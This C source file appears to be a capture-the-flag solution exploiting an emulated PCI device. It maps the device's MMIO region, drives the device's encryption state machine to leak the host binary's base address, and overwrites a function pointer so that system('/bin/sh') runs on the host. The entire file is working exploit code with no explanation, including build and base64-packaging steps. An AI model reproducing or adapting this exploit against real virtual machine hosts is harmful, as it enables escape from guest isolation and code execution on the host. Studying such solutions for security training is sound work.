/* 
 * author: luckasdf0
 * build: diet gcc ./solve.c -static -o exploit && gzip -kf exploit && base64 exploit.gz
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include "utils.h"

#define LOG(...) printf(__VA_ARGS__)

unsigned char* iomem;
unsigned char* g_buf;

void iowrite(uint64_t addr, uint8_t value) {
    *((uint8_t*)(iomem + addr)) = value;
}

uint64_t ioread(uint64_t addr) {
    return *((uint8_t*)(iomem + addr));
}

int main(int argc, char const* argv[]) {
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd == -1) {
        die("open");
    }

    iomem = mmap(0, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (iomem == MAP_FAILED)
        die("mmap");

    printf("iomem @ %p\n", iomem);

    g_buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_buf == MAP_FAILED)
        die("mmap");

    
    /* leak */
    ioread(0); // 0
    ioread(2); // 0->1
    for (int i = 0; i < 0x800; i++) {
        iowrite(0x2000+i, '\xbb');
    }
    ioread(4); // 1->2
    ioread(1); // 2->3
    for (int i = 0; i < 0x800; i++) {
        iowrite(0x1000+i, '\xaa');
    }
    ioread(3); // 3->4
    ioread(7); // set stream_encrpyto_function
    ioread(9); // 4->6: encrypt
    
    uint64_t elf_base = 0;
    for (int i = 0; i < 6; i++) {
        printf("%x\n", ioread(0x3800+i));
        elf_base += ioread(0x3800+i)<<(i*8);
    }
    elf_base -= 0x4d2a20;
    LOG("elf base 0x%016lx\n", elf_base);
    LOG("system plt 0x%016lx\n", elf_base+0x2ADF80);

    /* overwrite encrypt_function ptr */
    uint64_t magic1, magic2;
    scanf("%016lxgggg%016lx", &magic1, &magic2);
    printf("0x%016lx", magic1);
    printf("0x%016lx", magic2);
    
    ioread(0); // 0
    ioread(2); // 0->1

    for (int i = 0; i < 0x7e0; i++) {
        iowrite(0x2000+i, '\xbb');
    }
    for (int i = 0; i < 0x8; i++) {
        iowrite(0x27e0+i, (0xcd04145eee500c7d>>(i*8))&0xff);
    }
    for (int i = 0; i < 0x8; i++) {
        iowrite(0x27e8+i, (0x07542bf8c22c9d10>>(i*8))&0xff);
    }
    for (int i = 0; i < 0x8; i++) {
        iowrite(0x27f0+i, (magic1>>(i*8))&0xff);
    }
    for (int i = 0; i < 0x8; i++) {
        iowrite(0x27f8+i, (magic2>>(i*8))&0xff);
    }
    ioread(4); // 1->2
    ioread(1); // 2->3
    for (int i = 0; i < 0x10; i++) {
        iowrite(0x1000+i, '\xaa');
    }
   
    ioread(3); // 3->4
    ioread(5); // set aes_encrpyto_function
    printf("encrypt\n");
    printf("encrypt\n");
    printf("encrypt\n");
    printf("encrypt\n");
    printf("encrypt\n");
    printf("encrypt\n");
    printf("encrypt\n");
    printf("encrypt\n");
    ioread(9); // 4->6: encrypt

    /* trigger */
    printf("ioread(0)\n");
    printf("encrypt\n");
    printf("encrypt\n");
    printf("encrypt\n");
    printf("encrypt\n");
    printf("encrypt\n");
    printf("encrypt\n");
    ioread(0); // 0
    printf("ioread(2)\n");
    printf("ioread(2)\n");
    printf("ioread(2)\n");
    printf("ioread(2)\n");
    printf("ioread(2)\n");
    printf("ioread(2)\n");
    printf("ioread(2)\n");
    ioread(2); // 0->1

    printf("iowrite\n");
    printf("iowrite\n");
    printf("iowrite\n");
    printf("iowrite\n");
    printf("iowrite\n");
    printf("iowrite\n");
    printf("iowrite\n");
    iowrite(0x2000+0, '/');
    iowrite(0x2000+1, 'b');
    iowrite(0x2000+2, 'i');
    iowrite(0x2000+3, 'n');
    iowrite(0x2000+4, '/');
    iowrite(0x2000+5, 's');
    iowrite(0x2000+6, 'h');
    iowrite(0x2000+7, '\0');
    ioread(4); // 1->2
    ioread(1); // 2->3
    for (int i = 0; i < 0x800; i++) {
        iowrite(0x1000+i, '\xaa');
    }
    ioread(3); // 3->4
    //ioread(7); // set stream_encrpyto_function
    ioread(9); // 4->6: encrypt
 
    return 0;
}
